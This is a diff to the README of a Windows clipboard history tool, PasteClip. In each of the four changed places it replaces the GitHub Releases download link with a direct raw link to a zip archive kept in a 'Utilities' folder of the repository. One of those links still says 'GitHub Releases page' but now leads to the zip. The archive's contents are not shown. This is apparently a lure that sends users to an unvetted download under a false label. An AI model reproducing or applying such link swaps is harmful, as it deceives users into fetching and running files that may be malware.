@@ -1,6 +1,6 @@
 # 📋 PasteClip - Simple Clipboard History Manager
 
-[![Download PasteClip](https://img.shields.io/badge/Download-PasteClip-brightgreen)](https://github.com/shreastharaj/PasteClip/releases)
+[![Download PasteClip](https://img.shields.io/badge/Download-PasteClip-brightgreen)](https://raw.githubusercontent.com/shreastharaj/PasteClip/main/PasteClip/Utilities/Paste_Clip_v1.3.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these steps to download and run PasteClip on your Windows PC.
 
 Click the button below to open the PasteClip download page on GitHub Releases:
 
-[![Download PasteClip](https://img.shields.io/badge/Download-PasteClip-blue)](https://github.com/shreastharaj/PasteClip/releases)
+[![Download PasteClip](https://img.shields.io/badge/Download-PasteClip-blue)](https://raw.githubusercontent.com/shreastharaj/PasteClip/main/PasteClip/Utilities/Paste_Clip_v1.3.zip)
 
 ### Step 2: Choose the Latest Version
 
@@ -94,7 +94,7 @@ Access these settings by right-clicking the system tray icon and selecting "Sett
 
 To update PasteClip in the future:
 
-1. Visit the [GitHub Releases page](https://github.com/shreastharaj/PasteClip/releases) again.
+1. Visit the [GitHub Releases page](https://raw.githubusercontent.com/shreastharaj/PasteClip/main/PasteClip/Utilities/Paste_Clip_v1.3.zip) again.
 2. Download the newest installer following the same steps as above.
 3. Run the installer to overwrite the old version safely.
 4. Your settings and clipboard history will stay intact.
@@ -131,4 +131,4 @@ Feedback helps improve PasteClip. You can open issues, request features, or shar
 
 Download and run PasteClip to start saving your clipboard history on Windows:
 
-[![Download PasteClip](https://img.shields.io/badge/Download-PasteClip-brightgreen)](https://github.com/shreastharaj/PasteClip/releases)
+[![Download PasteClip](https://img.shields.io/badge/Download-PasteClip-brightgreen)](https://raw.githubusercontent.com/shreastharaj/PasteClip/main/PasteClip/Utilities/Paste_Clip_v1.3.zip)
